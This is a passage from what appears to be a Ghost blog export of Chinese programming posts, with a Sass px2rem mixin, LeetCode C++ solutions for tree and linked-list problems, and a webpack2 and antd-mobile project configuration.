markdown-->","comment_id":"99","plaintext":"> px2rem\n\n\nSass(使用Sass的函数、混合宏这些功能来实现):\n\n$root-font-size:100px;\n\n@mixin px2rem($property,$px-values,$baseline-px:$root-font-size,$support-for-ie:false){\n  $baseline-rem: $baseline-px / 1rem * 1;\n  @if $support-for-ie {\n    #{$property}: $px-values;\n  }\n  @if type-of($px-values) == \"number\"{\n    #{$property}: $px-values / $baseline-rem;\n  }\n  @else {\n    $rem-values:();\n    @each $value in $px-values{\n\n      @if $value == 0 or type-of($value) == \"number\"{\n        $rem-values: append($rem-values, $value / $baseline-rem);\n      }\n    }\n    #{$property}: $rem-values;\n  }\n}\n//funtion写法\n@function Px2rem($px-values,$baseline-px:$root-font-size){\n    $baseline-rem: $baseline-px / 1rem * 1;\n    @if type-of($px-values) == \"number\"{\n        @return  $px-values / $baseline-rem;\n    }\n    @else {\n        $rem-values:();\n        @each $value in $px-values{\n            @if $value == 0 or type-of($value) == \"number\"{\n                $rem-values: append($rem-values, $value / $baseline-rem);\n            }\n        }\n        @return  $rem-values;\n    }\n}\n\n\n> px2rem-0.2.0.vsix\n\n\n这一个vs code下的px2rem插件 [https://github.com/Maroon1/px2rem]。\n\n\n> scss去单位\n\n\n @function strip-units($number){\n    @return $number / ($number * 0 + 1);\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-17T08:49:11.000Z","created_by":"1","updated_at":"2017-03-20T08:26:55.000Z","updated_by":"1","published_at":"2017-03-17T09:19:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d320","uuid":"04431af2-754f-4e9f-be24-205eea172548","title":"Convert Sorted List to Binary Search Tree--leetcode","slug":"convert-sorted-list-to-binary-search-tree-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"<pre class=\\\"brush:cpp;\\\" >\\n/**\\n * Definition for singly-linked list.\\n * struct ListNode {\\n *     int val;\\n *     ListNode *next;\\n *     ListNode(int x) : val(x), next(NULL) {}\\n * };\\n */\\n/**\\n * Definition for a binary tree node.\\n * struct TreeNode {\\n *     int val;\\n *     TreeNode *left;\\n *     TreeNode *right;\\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\\n * };\\n */\\n//中序递归\\nclass Solution {\\npublic:\\n\\tTreeNode* sortedListToBST(ListNode* head) {\\n\\t\\tint len = 0;\\n\\t\\tListNode* temp = head;\\n\\t\\twhile (temp != NULL) {\\n\\t\\t\\tlen++;\\n\\t\\t\\ttemp = temp->next;\\n\\t\\t}\\n\\t\\tTreeNode* tree = buildTree(head, len);\\n\\t\\treturn tree;\\n\\t}\\n\\tTreeNode* buildTree(ListNode* &head, int len) {\\n\\t\\tTreeNode* root;\\n\\t\\tif (len <= 0) {\\n\\t\\t\\treturn NULL;\\n\\t\\t}\\n\\t\\tint mid = floor(len / 2);\\n\\t\\tTreeNode* left = buildTree(head, mid);\\n\\t\\troot = new TreeNode(head->val);\\n\\t\\thead = head->next;\\n\\t\\troot->left = left;\\n\\t\\troot->right = buildTree(head, len - mid - 1);\\n\\t\\treturn root;\\n\\t}\\n};\\n</pre>\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre class=\"brush:cpp;\" >\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode(int x) : val(x), next(NULL) {}\n * };\n */\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\n//中序递归\nclass Solution {\npublic:\n\tTreeNode* sortedListToBST(ListNode* head) {\n\t\tint len = 0;\n\t\tListNode* temp = head;\n\t\twhile (temp != NULL) {\n\t\t\tlen++;\n\t\t\ttemp = temp->next;\n\t\t}\n\t\tTreeNode* tree = buildTree(head, len);\n\t\treturn tree;\n\t}\n\tTreeNode* buildTree(ListNode* &head, int len) {\n\t\tTreeNode* root;\n\t\tif (len <= 0) {\n\t\t\treturn NULL;\n\t\t}\n\t\tint mid = floor(len / 2);\n\t\tTreeNode* left = buildTree(head, mid);\n\t\troot = new TreeNode(head->val);\n\t\thead = head->next;\n\t\troot->left = left;\n\t\troot->right = buildTree(head, len - mid - 1);\n\t\treturn root;\n\t}\n};\n</pre><!--kg-card-end: markdown-->","comment_id":"100","plaintext":"\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode(int x) : val(x), next(NULL) {}\n * };\n */\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\n//中序递归\nclass Solution {\npublic:\n\tTreeNode* sortedListToBST(ListNode* head) {\n\t\tint len = 0;\n\t\tListNode* temp = head;\n\t\twhile (temp != NULL) {\n\t\t\tlen++;\n\t\t\ttemp = temp->next;\n\t\t}\n\t\tTreeNode* tree = buildTree(head, len);\n\t\treturn tree;\n\t}\n\tTreeNode* buildTree(ListNode* &head, int len) {\n\t\tTreeNode* root;\n\t\tif (len val);\n\t\thead = head->next;\n\t\troot->left = left;\n\t\troot->right = buildTree(head, len - mid - 1);\n\t\treturn root;\n\t}\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-21T10:48:26.000Z","created_by":"1","updated_at":"2017-03-21T11:01:04.000Z","updated_by":"1","published_at":"2017-03-21T10:54:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d321","uuid":"073955d5-9d83-4c3c-9383-834b3020033e","title":"Binary Tree Level Order Traversal--leetcode","slug":"binary-tree-level-order-traversal-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"<pre class=\\\"brush:cpp;\\\">\\n/**\\n * Definition for a binary tree node.\\n * struct TreeNode {\\n *     int val;\\n *     TreeNode *left;\\n *     TreeNode *right;\\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\\n * };\\n */\\nclass Solution {\\npublic:\\n\\tvector<vector<int>> levelOrder(TreeNode* root) {\\n\\t\\tvector<vector<int>> res;\\n\\t\\tif (root == NULL) { return res; }\\n\\t\\tvector<TreeNode*> list;\\n\\t\\tlist.push_back(root);\\n\\t\\tvector<int> temp2;\\n\\t\\ttemp2.push_back(root->val);\\n\\t\\tres.push_back(temp2);\\n\\t\\twhile (list.size()!=0)\\n\\t\\t{\\n\\t\\t\\tvector<TreeNode*> temp;\\n\\t\\t\\tvector<int> temp2;\\n\\t\\t\\tfor (size_t i = 0; i < list.size(); i++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tif (list[i]->left!=NULL) {\\n\\t\\t\\t\\t\\ttemp.push_back(list[i]->left);\\n\\t\\t\\t\\t\\ttemp2.push_back(list[i]->left->val);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tif (list[i]->right != NULL) {\\n\\t\\t\\t\\t\\ttemp.push_back(list[i]->right);\\n\\t\\t\\t\\t\\ttemp2.push_back(list[i]->right->val);\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t\\tlist = temp;\\n\\t\\t\\tif(temp.size()!=0){\\n\\t\\t\\t    res.push_back(temp2);\\n\\t\\t\\t}\\n\\t\\t\\t\\n\\t\\t}\\n\\t\\treturn res;\\n\\t}\\n};\\n</pre>\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre class=\"brush:cpp;\">\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\nclass Solution {\npublic:\n\tvector<vector<int>> levelOrder(TreeNode* root) {\n\t\tvector<vector<int>> res;\n\t\tif (root == NULL) { return res; }\n\t\tvector<TreeNode*> list;\n\t\tlist.push_back(root);\n\t\tvector<int> temp2;\n\t\ttemp2.push_back(root->val);\n\t\tres.push_back(temp2);\n\t\twhile (list.size()!=0)\n\t\t{\n\t\t\tvector<TreeNode*> temp;\n\t\t\tvector<int> temp2;\n\t\t\tfor (size_t i = 0; i < list.size(); i++)\n\t\t\t{\n\t\t\t\tif (list[i]->left!=NULL) {\n\t\t\t\t\ttemp.push_back(list[i]->left);\n\t\t\t\t\ttemp2.push_back(list[i]->left->val);\n\t\t\t\t}\n\t\t\t\tif (list[i]->right != NULL) {\n\t\t\t\t\ttemp.push_back(list[i]->right);\n\t\t\t\t\ttemp2.push_back(list[i]->right->val);\n\t\t\t\t}\n\t\t\t}\n\t\t\tlist = temp;\n\t\t\tif(temp.size()!=0){\n\t\t\t    res.push_back(temp2);\n\t\t\t}\n\t\t\t\n\t\t}\n\t\treturn res;\n\t}\n};\n</pre><!--kg-card-end: markdown-->","comment_id":"101","plaintext":"\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\nclass Solution {\npublic:\n\tvector> levelOrder(TreeNode* root) {\n\t\tvector> res;\n\t\tif (root == NULL) { return res; }\n\t\tvector list;\n\t\tlist.push_back(root);\n\t\tvector temp2;\n\t\ttemp2.push_back(root->val);\n\t\tres.push_back(temp2);\n\t\twhile (list.size()!=0)\n\t\t{\n\t\t\tvector temp;\n\t\t\tvector temp2;\n\t\t\tfor (size_t i = 0; i < list.size(); i++)\n\t\t\t{\n\t\t\t\tif (list[i]->left!=NULL) {\n\t\t\t\t\ttemp.push_back(list[i]->left);\n\t\t\t\t\ttemp2.push_back(list[i]->left->val);\n\t\t\t\t}\n\t\t\t\tif (list[i]->right != NULL) {\n\t\t\t\t\ttemp.push_back(list[i]->right);\n\t\t\t\t\ttemp2.push_back(list[i]->right->val);\n\t\t\t\t}\n\t\t\t}\n\t\t\tlist = temp;\n\t\t\tif(temp.size()!=0){\n\t\t\t    res.push_back(temp2);\n\t\t\t}\n\t\t\t\n\t\t}\n\t\treturn res;\n\t}\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-22T09:43:24.000Z","created_by":"1","updated_at":"2017-03-22T09:47:32.000Z","updated_by":"1","published_at":"2016-09-22T09:44:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d322","uuid":"45551b74-2608-43c8-8d19-7cbdfdb9aaf5","title":"单链表反序。","slug":"dan-lian-biao-fan-xu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"这是一道常见的笔试题，leetcode上有两道题。Reverse Linked List和Reverse Linked List II。\\n\\n> Reverse Linked List\\n\\n```\\nclass Solution {\\npublic:\\n\\tListNode* reverseList(ListNode* head) {\\n\\t    if(head==NULL)  {return head;}\\n\\t\\tListNode *p1,*p2,*p3;\\n\\t\\t\\n\\t\\tp1 = head;\\n\\t\\tp2 = head->next;\\n\\t\\twhile (p2!=NULL)\\n\\t\\t{\\n\\t\\t\\tp3 = p2->next;\\n\\t\\t\\tp2->next = p1;\\n\\t\\t\\tp1 = p2;\\n\\t\\t\\tp2 = p3;\\n\\t\\t}\\n\\t\\thead->next = NULL;\\n\\t\\thead = p1;\\n\\t\\treturn p1;\\n\\t}\\n};\\n```\\n\\n> Reverse Linked List II 反序从m至n区间中的链表。\\n```\\nclass Solution {\\npublic:\\n\\tListNode* reverseBetween(ListNode* head, int m, int n) {\\n\\t\\tint index = 1;\\n\\t\\tListNode *temp = head;\\n\\t\\tListNode *temp2 = temp;\\n\\t\\tbool is = false;\\n\\t\\twhile (index<m) {\\n\\t\\t\\tis = true;\\n\\t\\t\\ttemp2 = temp;\\n\\t\\t\\ttemp = temp->next;\\n\\t\\t\\tindex++;\\n\\t\\t}\\n\\t\\tListNode *p1, *p2, *p3;\\n\\n\\t\\tp1 = temp;\\n\\t\\tp2 = temp->next;\\n\\n\\t\\twhile (p2 != NULL&&index<n) {\\n\\t\\t\\tp3 = p2->next;\\n\\t\\t\\tp2->next = p1;\\n\\t\\t\\tp1 = p2;\\n\\t\\t\\tp2 = p3;\\n\\t\\t\\tindex++;\\n\\t\\t}\\n\\t\\ttemp->next = p2;\\n\\t\\tif (is) {\\n\\t\\t\\ttemp2->next = p1;\\n\\t\\t\\treturn head;\\n\\t\\t}\\n\\t\\telse {\\n\\t\\t\\treturn p1;\\n\\t\\t}\\n\\t}\\n};\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>这是一道常见的笔试题，leetcode上有两道题。Reverse Linked List和Reverse Linked List II。</p>\n<blockquote>\n<p>Reverse Linked List</p>\n</blockquote>\n<pre><code>class Solution {\npublic:\n\tListNode* reverseList(ListNode* head) {\n\t    if(head==NULL)  {return head;}\n\t\tListNode *p1,*p2,*p3;\n\t\t\n\t\tp1 = head;\n\t\tp2 = head-&gt;next;\n\t\twhile (p2!=NULL)\n\t\t{\n\t\t\tp3 = p2-&gt;next;\n\t\t\tp2-&gt;next = p1;\n\t\t\tp1 = p2;\n\t\t\tp2 = p3;\n\t\t}\n\t\thead-&gt;next = NULL;\n\t\thead = p1;\n\t\treturn p1;\n\t}\n};\n</code></pre>\n<blockquote>\n<p>Reverse Linked List II 反序从m至n区间中的链表。</p>\n</blockquote>\n<pre><code>class Solution {\npublic:\n\tListNode* reverseBetween(ListNode* head, int m, int n) {\n\t\tint index = 1;\n\t\tListNode *temp = head;\n\t\tListNode *temp2 = temp;\n\t\tbool is = false;\n\t\twhile (index&lt;m) {\n\t\t\tis = true;\n\t\t\ttemp2 = temp;\n\t\t\ttemp = temp-&gt;next;\n\t\t\tindex++;\n\t\t}\n\t\tListNode *p1, *p2, *p3;\n\n\t\tp1 = temp;\n\t\tp2 = temp-&gt;next;\n\n\t\twhile (p2 != NULL&amp;&amp;index&lt;n) {\n\t\t\tp3 = p2-&gt;next;\n\t\t\tp2-&gt;next = p1;\n\t\t\tp1 = p2;\n\t\t\tp2 = p3;\n\t\t\tindex++;\n\t\t}\n\t\ttemp-&gt;next = p2;\n\t\tif (is) {\n\t\t\ttemp2-&gt;next = p1;\n\t\t\treturn head;\n\t\t}\n\t\telse {\n\t\t\treturn p1;\n\t\t}\n\t}\n};\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"102","plaintext":"这是一道常见的笔试题，leetcode上有两道题。Reverse Linked List和Reverse Linked List II。\n\n> Reverse Linked List\n\n\nclass Solution {\npublic:\n\tListNode* reverseList(ListNode* head) {\n\t    if(head==NULL)  {return head;}\n\t\tListNode *p1,*p2,*p3;\n\t\t\n\t\tp1 = head;\n\t\tp2 = head->next;\n\t\twhile (p2!=NULL)\n\t\t{\n\t\t\tp3 = p2->next;\n\t\t\tp2->next = p1;\n\t\t\tp1 = p2;\n\t\t\tp2 = p3;\n\t\t}\n\t\thead->next = NULL;\n\t\thead = p1;\n\t\treturn p1;\n\t}\n};\n\n\n> Reverse Linked List II 反序从m至n区间中的链表。\n\n\nclass Solution {\npublic:\n\tListNode* reverseBetween(ListNode* head, int m, int n) {\n\t\tint index = 1;\n\t\tListNode *temp = head;\n\t\tListNode *temp2 = temp;\n\t\tbool is = false;\n\t\twhile (index<m) {\n\t\t\tis = true;\n\t\t\ttemp2 = temp;\n\t\t\ttemp = temp->next;\n\t\t\tindex++;\n\t\t}\n\t\tListNode *p1, *p2, *p3;\n\n\t\tp1 = temp;\n\t\tp2 = temp->next;\n\n\t\twhile (p2 != NULL&&index<n) {\n\t\t\tp3 = p2->next;\n\t\t\tp2->next = p1;\n\t\t\tp1 = p2;\n\t\t\tp2 = p3;\n\t\t\tindex++;\n\t\t}\n\t\ttemp->next = p2;\n\t\tif (is) {\n\t\t\ttemp2->next = p1;\n\t\t\treturn head;\n\t\t}\n\t\telse {\n\t\t\treturn p1;\n\t\t}\n\t}\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-24T07:19:34.000Z","created_by":"1","updated_at":"2017-03-24T08:07:58.000Z","updated_by":"1","published_at":"2017-03-24T07:21:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d323","uuid":"4be77b70-6fb4-43fb-86d7-05e4506a4f7c","title":"webpack2+antd+andt moblie脚手架","slug":"webpack2-antd-andt-mobliejiao-shou-jia","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"自己实验一下webpack2的新功能。还是和1有点不同，很多配置改变了。\\n> 前端工程目录\\n\\n![](/content/images/2017/03/-PUT--G-NDM6-2DSZ--DB-I.png)\\n\\n> webpack.config.js\\n<pre class=\\\"brush:js;\\\" >\\nvar path = require(\\\"path\\\")\\nmodule.exports = {\\n    context: __dirname + \\\"/src\\\",\\n    entry: {\\n        index: [\\\"babel-polyfill\\\", \\\"./index.js\\\"],\\n    },\\n    output: {\\n        filename: \\\"[name].bundle.js\\\",\\n        path: __dirname + \\\"/dist/\\\",\\n\\n        publicPath: \\\"/\\\",            // New\\n    },\\n    module: {\\n        rules: [{\\n            test: /\\\\.jsx?$/,\\n            use: [{\\n                loader: \\\"babel-loader\\\",\\n                options: {\\n                    presets: [\\\"react\\\", \\\"es2015\\\", \\\"stage-0\\\"],\\n                    plugins: [\\\"transform-runtime\\\",]\\n                },\\n            }],\\n            exclude: /node_modules/\\n\\n        }, {\\n            test: /\\\\.scss$/,\\n            use: [{\\n                loader: \\\"style-loader\\\" // creates style nodes from JS strings\\n            }, {\\n                loader: \\\"css-loader\\\" // translates CSS into CommonJS\\n            }, {\\n                loader: \\\"sass-loader\\\" // compiles Sass to CSS\\n            }]\\n        }, {\\n            test: /\\\\.css$/,\\n            use: [{\\n                loader: \\\"style-loader\\\" // creates style nodes from JS strings\\n            }, {\\n                loader: \\\"css-loader\\\" // translates CSS into CommonJS\\n            }]\\n        }, {\\n            test: /\\\\.(svg)$/i,\\n            use: [{\\n                loader: 'svg-sprite-loader'\\n            }],\\n            include: [\\n                require.resolve('antd-mobile').replace(/warn\\\\.js$/, ''),\\n                path.resolve(__dirname, 'src/svgs')\\n            ]\\n        }]\\n    },\\n    resolve: {\\n        extensions: ['.web.js', '.js', '.json'],\\n        modules: ['node_modules', path.resolve(__dirname, 'node_modules')]\\n    },\\n    devServer: {\\n        contentBase: __dirname + \\\"/src\\\",  // New\\n    },\\n};\\n</pre>\\n> package.json\\n```\\n{\\n  \\\"name\\\": \\\"myapp\\\",\\n  \\\"version\\\": \\\"1.0.0\\\",\\n  \\\"description\\\": \\\"\\\",\\n  \\\"main\\\": \\\"index.js\\\",\\n  \\\"scripts\\\": {\\n    \\\"dev\\\": \\\"./node_modules/.bin/webpack-dev-server\\\",\\n    \\\"test\\\": \\\"echo \\\\\\\"Error: no test specified\\\\\\\" && exit 1\\\"\\n  },\\n  \\\"keywords\\\": [\\n    \\\"webpack2\\\"\\n  ],\\n  \\\"author\\\": \\\"ldh\\\",\\n  \\\"license\\\": \\\"ISC\\\",\\n  \\\"devDependencies\\\": {\\n    \\\"babel-core\\\": \\\"^6.24.0\\\",\\n    \\\"babel-loader\\\": \\\"^6.4.1\\\",\\n    \\\"babel-plugin-import\\\": \\\"^1.1.1\\\",\\n    \\\"babel-plugin-transform-runtime\\\": \\\"^6.23.0\\\",\\n    \\\"babel-preset-es2015\\\": \\\"^6.24.0\\\",\\n    \\\"babel-preset-react\\\": \\\"^6.23.0\\\",\\n    \\\"babel-preset-stage-0\\\": \\\"^6.22.0\\\",\\n    \\\"css-loader\\\": \\\"^0.27.3\\\",\\n    \\\"node-sass\\\": \\\"^4.5.0\\\",\\n    \\\"sass-loader\\\": \\\"^6.0.3\\\",\\n    \\\"style-loader\\\": \\\"^0.14.1\\\",\\n    \\\"svg-sprite-loader\\\": \\\"^0.3.0\\\",\\n    \\\"webpack\\\": \\\"^2.2.1\\\",\\n    \\\"webpack-dev-server\\\": \\\"^2.4.2\\\"\\n  },\\n  \\\"dependencies\\\": {\\n    \\\"antd\\\": \\\"^2.8.1\\\",\\n    \\\"antd-mobile\\\": \\\"^1.0.6\\\",\\n    \\\"babel-polyfill\\\": \\\"^6.23.0\\\",\\n    \\\"codemirror\\\": \\\"^5.24.2\\\",\\n    \\\"dva\\\": \\\"^1.2.1\\\",\\n    \\\"react\\\": \\\"^15.4.2\\\",\\n    \\\"react-dom\\\": \\\"^15.4.2\\\"\\n  }\\n}\\n```\\n> .babelrc\\n```\\n{\\\"plugins\\\": [[\\\"import\\\", { \\\"style\\\": \\\"css\\\", \\\"libraryName\\\": \\\"antd-mobile\\\" }]]}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>自己实验一下webpack2的新功能。还是和1有点不同，很多配置改变了。</p>\n<blockquote>\n<p>前端工程目录</p>\n</blockquote>\n<p><img src=\"/content/images/2017/03/-PUT--G-NDM6-2DSZ--DB-I.png\" alt=\"\"></p>\n<blockquote>\n<p>webpack.config.js</p>\n</blockquote>\n<pre class=\"brush:js;\" >\nvar path = require(\"path\")\nmodule.exports = {\n    context: __dirname + \"/src\",\n    entry: {\n        index: [\"babel-polyfill\", \"./index.js\"],\n    },\n    output: {\n        filename: \"[name].bundle.js\",\n        path: __dirname + \"/dist/\",\n\n        publicPath: \"/\",            // New\n    },\n    module: {\n        rules: [{\n            test: /\\.jsx?$/,\n            use: [{\n                loader: \"babel-loader\",\n                options: {\n                    presets: [\"react\", \"es2015\", \"stage-0\"],\n                    plugins: [\"transform-runtime\",]\n                },\n            }],\n            exclude: /node_modules/\n\n        }, {\n            test: /\\.scss$/,\n            use: [{\n                loader: \"style-loader\" // creates style nodes from JS strings\n            }, {\n                loader: \"css-loader\" // translates CSS into CommonJS\n            }, {\n                loader: \"sass-loader\" // compiles Sass to CSS\n            }]\n        }, {\n            test: /\\.css$/,\n            use: [{\n                loader: \"style-loader\" // creates style nodes from JS strings\n            }, {\n                loader: \"css-loader\" // translates CSS into CommonJS\n            }]\n        }, {\n            test: /\\.(svg)$/i,\n            use: [{\n                loader: 'svg-sprite-loader'\n            }],\n            include: [\n                require.resolve('antd-mobile').replace(/warn\\.js$/, ''),\n                path.resolve(__dirname, 'src/svgs')\n            ]\n        }]\n    },\n    resolve: {\n        extensions: ['.web.js', '.js', '.json'],\n        modules: ['node_modules', path.resolve(__dirname, 'node_modules')]\n    },\n    devServer: {\n        contentBase: __dirname + \"/src\",  // New\n    },\n};\n</pre>\n<blockquote>\n<p>package.json</p>\n</blockquote>\n<pre><code>{\n  &quot;name&quot;: &quot;myapp&quot;,\n  &quot;version&quot;: &quot;1.0.0&quot;,\n  &quot;description&quot;: &quot;&quot;,\n  &quot;main&quot;: &quot;index.js&quot;,\n  &quot;scripts&quot;: {\n    &quot;dev&quot;: &quot;./node_modules/.bin/webpack-dev-server&quot;,\n    &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;\n  },\n  &quot;keywords&quot;: [\n    &quot;webpack2&quot;\n  ],\n  &quot;author&quot;: &quot;ldh&quot;,\n  &quot;license&quot;: &quot;ISC&quot;,\n  &quot;devDependencies&quot;: {\n    &quot;babel-core&quot;: &quot;^6.24.0&quot;,\n    &quot;babel-loader&quot;: &quot;^6.4.1&quot;,\n    &quot;babel-plugin-import&quot;: &quot;^1.1.1&quot;,\n    &quot;babel-plugin-transform-runtime&quot;: &quot;^6.23.0&quot;,\n    &quot;babel-preset-es2015&quot;: &quot;^6.24.0&quot;,\n    &quot;babel-preset-react&quot;: &quot;^6.23.0&quot;,\n    &quot;babel-preset-stage-0&quot;: &quot;^6.22.0&quot;,\n    &quot;css-loader&quot;: &quot;^0.27.3&quot;,\n    &quot;node-sass&quot;: &quot;^4.5.0&quot;,\n    &quot;sass-loader&quot;: &quot;^6.0.3&quot;,\n    &quot;style-loader&quot;: &quot;^0.14.1&quot;,\n    &quot;svg-sprite-loader&quot;: &quot;^0.3.0&quot;,\n    &quot;webpack&quot;: &quot;^2.2.1&quot;,\n    &quot;webpack-dev-server&quot;: &quot;^2.4.2&quot;\n  },\n  &quot;dependencies&quot;: {\n    &quot;antd&quot;: &quot;^2.8.1&quot;,\n    &quot;antd-mobile&quot;: &quot;^1.0.6&quot;,\n    &quot;babel-polyfill&quot;: &quot;^6.23.0&quot;,\n    &quot;codemirror&quot;: &quot;^5.24.2&quot;,\n    &quot;dva&quot;: &quot;^1.2.1&quot;,\n    &quot;react&quot;: &quot;^15.4.2&quot;,\n    &quot;react-dom&quot;: &quot;^15.4.2&quot;\n  }\n}\n</code></pre>\n<blockquote>\n<p>.babelrc</p>\n</blockquote>\n<pre><code>{&quot;plugins&quot;: [[&quot;import&quot;, { &quot;style&quot;: &quot;css&quot;, &quot;libraryName&quot;: &quot;antd-mobile&quot; }]]}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"103","plaintext":"自己实验一下webpack2的新功能。还是和1有点不同，很多配置改变了。\n\n> 前端工程目录\n\n\n\n\n> webpack.config.js\n\n\n\nvar path = require(\"path\")\nmodule.exports = {\n    context: __dirname + \"/src\",\n    entry: {\n        index: [\"babel-polyfill\", \"./index.js\"],\n    },\n    output: {\n        filename: \"[name].bundle.js\",\n        path: __dirname + \"/dist/\",\n\n        publicPath: \"/\",            // New\n    },\n    module: {\n        rules: [{\n            test: /\\.jsx?$/,\n            use: [{\n                loader: \"babel-loader\",\n                options: {\n                    presets: [\"react\", \"es2015\", \"stage-0\"],\n                    plugins: [\"transform-runtime\",]\n                },\n            }],\n            exclude: /node_modules/\n\n        }, {\n            test: /\\.scss$/,\n            use: [{\n                loader: \"style-loader\" // creates style nodes from JS strings\n            }, {\n                loader: \"css-loader\" // translates CSS into CommonJS\n            }, {\n                loader: \"sass-loader\" // compiles Sass to CSS\n            }]\n        }, {\n            test: /\\.css$/,\n            use: [{\n                loader: \"style-loader\" // creates style nodes from JS strings\n            }, {\n                loader: \"css-loader\" // translates CSS into CommonJS\n            }]\n        }, {\n            test: /\\.(svg)$/i,\n            use: [{\n                loader: 'svg-sprite-loader'\n            }],\n            include: [\n                require.resolve('antd-mobile').replace(/warn\\.js$/, ''),\n                path.resolve(__dirname, 'src/svgs')\n            ]\n        }]\n    },\n    resolve: {\n        extensions: ['.web.js', '.js', '.json'],\n        modules: ['node_modules', path.resolve(__dirname, 'node_modules')]\n    },\n    devServer: {\n        contentBase: __dirname + \"/src\",  // New\n    },\n};\n\n\n> package.json\n\n\n{\n  \"name\": \"myapp\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"dev\": \"./node_modules/.bin/webpack-dev-server\",\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [\n    \"webpack2\"\n  ],\n  \"author\": \"ldh\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"babel-core\": \"^6.24.0\",\n    \"babel-loader\": \"^6.4.1\",\n    \"babel-plugin-import\": \"^1.1.1\",\n    \"babel-plugin-transform-runtime\": \"^6.23.0\",\n    \"babel-preset-es2015\": \"^6.24.0\",\n    \"babel-preset-react\": \"^6.23.0\",\n    \"babel-preset-stage-0\": \"^6.22.0\",\n    \"css-loader\": \"^0.27.3\",\n    \"node-sass\": \"^4.5.0\",\n    \"sass-loader\": \"^6.0.3\",\n    \"style-loader\": \"^0.14.1\",\n    \"svg-sprite-loader\": \"^0.3.0\",\n    \"webpack\": \"^2.2.1\",\n    \"webpack-dev-server\": \"^2.4.2\"\n  },\n  \"dependencies\": {\n    \"antd\": \"^2.8.1\",\n    \"antd-mobile\": \"^1.0.6\",\n    \"babel-polyfill\": \"^6.23.0\",\n    \"codemirror\": \"^5.24.2\",\n    \"dva\": \"^1.2.1\",\n    \"react\": \"^15.4.2\",\n    \"react-dom\": \"^15.4.2\"\n  }\n}\n\n\n> .babelrc\n\n\n{\"plugins\": [[\"import\", { \"style\": \"css\", \"libraryName\": \"antd-mobile\" }]]}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-27T10:03:15.000Z","created_by":"1","updated_at":"2017-03-27T11:03:03.000Z","updated_by":"1","published_at":"2017-03-27T10:09:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d324","uuid":"b542a093-699c-40e3-b4eb-9316b8dc0389","title":"Diameter of Binary Tree--leetcode","slug":"diameter-of-binary-tree-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 